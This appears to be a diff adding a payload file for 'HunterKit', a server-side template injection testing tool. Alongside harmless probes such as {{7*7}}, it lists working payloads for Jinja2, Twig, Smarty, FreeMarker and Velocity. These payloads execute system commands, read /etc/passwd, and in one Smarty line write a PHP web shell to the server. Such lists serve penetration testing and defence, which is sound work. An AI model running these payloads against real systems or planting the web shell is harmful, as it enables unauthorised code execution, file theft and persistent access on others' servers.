@@ -1,0 +1,30 @@
+# HunterKit Advanced Payload File
+# SSTI vulnerability testing payloads
+# Developed by Kawindu Wijewardhane (@kawinduwijewardhane)
+# Add your custom payloads here - one payload per line
+# Lines starting with # are comments and will be ignored
+
+{{7*7}}
+{{7*'7'}}
+{{config}}
+{{config.items()}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{7*7}}
+{{dump(app)}}
+{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
+{{_self.env.getFilter('system')}}
+{php}echo 7*7;{/php}
+{php}system('id');{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php system($_GET[cmd]); ?>',false)}
+{$smarty.version}
+<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(' ')}
+#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
+$class.inspect($class.type)
+<%=7*7%>
+${7*7}
+#{7*7}
+%{7*7}
+{{7*7}}
+[7*7]
